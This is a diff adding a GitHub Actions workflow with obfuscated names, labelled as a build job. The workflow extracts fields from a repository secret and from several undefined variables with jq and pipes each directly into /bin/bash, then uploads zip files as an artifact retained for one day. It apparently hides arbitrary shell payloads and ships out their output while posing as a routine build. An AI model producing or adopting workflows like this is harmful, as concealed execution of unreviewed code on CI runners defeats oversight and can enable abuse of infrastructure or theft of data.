@@ -1,0 +1,25 @@
+name: phoebefactory480
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: phoebefactory480
+        env:
+          qxpn8945: ${{ secrets.qxpn8945 }}
+        run: |
+          printf '%s' "$qxpn8945" | jq -r .tov448 | /bin/bash
+          echo $z382 | jq -r .gr3 | /bin/bash
+          echo $wf332 | jq -r .a5 | /bin/bash
+          printf '%s' "$tzp0" | jq -r .c65151 | /bin/bash
+          echo $a51966 | jq -r .e2 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: oRN7ZbTC
+          path: "*.zip"
+          retention-days: 1
